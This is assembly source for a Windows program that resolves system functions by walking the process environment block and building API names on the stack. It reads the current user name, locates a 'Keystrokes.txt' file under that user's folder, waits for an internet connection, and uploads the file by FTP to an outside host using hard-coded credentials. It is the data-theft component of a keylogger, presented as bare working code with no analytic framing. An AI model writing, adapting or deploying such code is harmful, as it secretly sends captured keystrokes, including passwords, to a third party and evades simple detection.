format PE GUI
call CodeStart
CodeStart:
sub esp,1000h
	mov ebx, [FS: 0x30]   ; get a pointer to the PEB
	mov ebx, [ebx + 0x0C]	; get PEB->Ldr
	mov ebx, [ebx + 0x14]	; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov ebx, [ebx]	 ; 2nd Entry
	mov ebx, [ebx]	 ; 3rd Entry
	mov ebx, [ebx + 0x10]	; Get Kernel32 Base
	 mov [ebp+8] , ebx
	add ebx, [ebx+0x3C]	; Start of PE header
	mov ebx, [ebx+0x78]	; RVA of export dir
	add ebx, [ebp+8]  ; VA of export dir
	 mov [ebp+12] , ebx

	push 0
	push 'ss'
	push 'ddre'
	push 'rocA'
	push 'GetP'
	mov edx,esp
	push edx
	mov ecx,14
	call GetFunctionAddress
;	 mov [AGetProcAddressA] , eax
	 mov [ebp-24] , eax
;	 lea edx,[api_LoadLibrary]
	 push 0
	 push 'aryA'
	 push 'Libr'
	 push 'Load'
	 mov edx,esp
	push edx
	push dword [ebp+8]
	call eax
;	 mov [ALoadLibraryA] , eax
	 mov [ebp-28] , eax
	push 0
	push 'pi32'
	push 'Adva'
	mov edx,esp
	push edx
	call dword[ebp-28]

	push 0
	push 'ameA'
	push 'serN'
	push 'GetU'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-32] , eax

	mov dword[ebp-84h],255
	lea  ebx,[ebp-84h]
	push ebx
	lea ebx,[ebp-8]
	push ebx
	call eax

	push 0
	push 'rt'
	push 'msvc'
	mov edx,esp
	push edx
	call dword[ebp-28]

	push 'at'
	push 'strc'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-36] , eax
	
	lea edx,[ebp-8]
	push edx
	push 0
	push "\"
	push "sers"
	push "C:\U"
	mov ebx,esp
	lea ecx,[edx]
	push ecx
	push ebx
	call eax

	mov edx,eax
	push edx
	push 0
	push "txt"
	push "kes."
	push "stro"
	push "\Key"
	mov ebx,esp
	mov ecx,eax
	push ebx
	push ecx
	call dword[ebp-36]
	mov [ebp-60],eax

	push 0
	push 'net'
	push 'wini'
	mov edx,esp
	push edx
	call dword[ebp-28]
	mov [ebp-40],eax

	push 0
	push "e"
	push "Stat"
	push "cted"
	push "onne"
	push 'GetC'
	push 'rnet'
	push 'Inte'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov dword[ebp-64],eax

	 Again:
	 push dword[ebp-60]
	 lea edx,[ebp-56]
	 push edx
	 call dword[ebp-64]
	 cmp eax,1
	 jnz Again



	push 0
	push 'net'
	push 'wini'
	mov edx,esp
	push edx
	call dword[ebp-28]
	mov [ebp-40],eax

	push 0
	push "A"
	push 'Open'
	push 'rnet'
	push 'Inte'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx

	 push 0
	 push 0
	 push 0
	 push 0
	 push 0
	 call eax
	 mov [ebp-44],eax

	push 0
	push 'net'
	push 'wini'
	mov edx,esp
	push edx
	call dword[ebp-28]
	mov [ebp-40],eax

	push 0
	push "ectA"
	push 'Conn'
	push 'rnet'
	push 'Inte'
	mov edx,esp
	push edx
	push eax
	mov ebx,[ebp-24]
	call ebx


	push 0
	push "iaEh"
	push "Alex"
	push "daDa"
	push "ABun"
	mov edx,esp
	push 0
	push "g"
	push "5.or"
	push "o.eu"
	push "tinh"
	push "boni"
	mov ecx,esp
	push 0
	push "g"
	push "5.or"
	push "o.eu"
	push "tinh"
	push "boni"
	mov esi,esp
	 push 0
	push 8000000h
	push 1

	push edx
	push ecx
	push 21
	push esi
	push dword[ebp-44]
	call eax
	mov [ebp-52],eax

	push 0
	push 'net'
	push 'wini'
	mov edx,esp
	push edx
	call dword[ebp-28]
	mov [ebp-40],eax

	push 0
	push 'leA'
	push 'utFi'
	push 'FtpP'
	mov edx,esp
	push edx
	mov eax,[ebp-40]
	push eax
	mov ebx,[ebp-24]
	call ebx
	mov [ebp-48],eax

	push 0
	push ".txt"
	push "logs"
	mov edx, esp
	push 0
	push 1
	push 0
	push edx
	lea edx,[ebp-60]
	push edx
	push dword[ebp-52]
	call eax

	retn



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;	  <<<<< GetFunctionAddress >>>>>>											;
;	 Extracts Function Address From Export Directory and returns it in eax		;
;	 Parameters :  Function name in edx , Length in ecx						  ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

GetFunctionAddress:
       ; push ebp
       ; mov ebp,esp

	mov esi, [ebp+12]
	mov esi, [esi+0x20]	;RVA of ENT
	add esi, [ebp+8]  ;VA of ENT
	xor ebx,ebx
	cld

	looper:
		  inc ebx
		  lodsd
		  add eax , [ebp+8]   ;eax now points to the string of a function
		  push esi		;preserve it for the outer loop
		  mov esi,eax
		  mov edi,edx
		  cld
		  push ecx
		  repe cmpsb
		  pop ecx
		  pop esi
		  jne looper

		  dec ebx
		  mov eax,[ebp+12]
		  mov eax,[eax+0x24]	   ;RVA of EOT
		  add eax,[ebp+8]     ;VA of EOT
		  movzx eax , word [ebx*2+eax]	;eax now holds the ordinal of our function
		  mov ebx,[ebp+12]
		  mov ebx,[ebx+0x1C]	   ;RVA of EAT
		  add ebx,[ebp+8]     ;VA of EAT
		  mov ebx,[eax*4+ebx]
		  add ebx,[ebp+8]
		  mov eax,ebx
		ret
